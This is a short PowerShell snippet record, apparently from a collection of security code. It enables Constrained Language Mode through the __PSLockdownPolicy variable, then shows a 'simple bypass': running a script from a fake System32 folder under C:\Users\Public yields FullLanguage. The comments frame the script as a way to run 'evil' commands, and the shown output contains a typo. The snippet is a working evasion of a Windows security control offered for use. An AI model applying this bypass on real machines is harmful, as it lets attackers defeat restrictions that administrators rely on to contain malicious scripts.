---
id: 82cbe55e-4477-4f0d-a7be-0d113a03fb0a
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:26.491056+00:00'
updated_at: '2023-04-10T20:37:04.081265+00:00'
---

# Code Snippet 82cbe55e

**Language**: ps1

```ps1
# Enable CLM from the environment
[Environment]::SetEnvironmentVariable('__PSLockdownPolicy', '4', 'Machine')
Get-ChildItem -Path Env:

# Create a check-mode.ps1 containing your "evil" powershell commands
$mode = $ExecutionContext.SessionState.LanguageMode
write-host $mode

# Simple bypass, execute inside a System32 folder
PS C:\> C:\Users\Public\check-mode.ps1
ConstrainedLanguage

PS C:\> C:\Users\Public\System32\check-mode.ps1
FullLanguagge
```


